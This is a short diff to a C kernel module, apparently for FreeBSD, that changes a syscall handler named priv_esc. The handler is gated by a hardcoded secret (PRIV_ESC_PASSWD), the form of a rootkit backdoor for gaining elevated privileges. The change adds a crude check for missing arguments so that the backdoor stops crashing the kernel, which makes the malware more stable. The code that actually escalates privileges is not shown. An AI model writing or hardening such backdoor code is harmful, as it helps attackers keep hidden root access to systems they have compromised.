@@ -25,8 +25,15 @@ static int
 priv_esc(struct thread *td, void *syscall_args) {
 
     struct sc_args * args = (struct sc_args *) syscall_args;
+    if (args->passwd < (char *) 4096) {
+        // XXX crude way to check if no args were passed in.
+        // XXX if args->passwd is mapped to the first page (which is the NULL
+        // page hence no read/write permissions on the first page), then there
+        // are no args.
+        return (lkmnosys(td, NULL));
+    }
+
     if (strcmp(args->passwd, PRIV_ESC_PASSWD) != 0) {
-        // TODO check for no args passed (otherwise crashes kernel)
         return (lkmnosys(td, NULL));
     }
 
